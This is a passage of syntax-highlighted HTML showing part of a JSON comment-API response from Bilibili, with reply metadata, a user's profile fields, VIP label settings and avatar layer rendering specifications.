                      <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1673539200000</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;jump_url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;replies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;assist&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;up_action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reply&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;invisible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reply_control&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;max_line&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;time_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3天前发布&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;translation_switch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;has_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270935559601</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754906517</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270935559601&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Aidemofashi_&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;男&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aidemofashi_爱的魔法尸\nemail:zhonghuaiyu2019@163.com&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    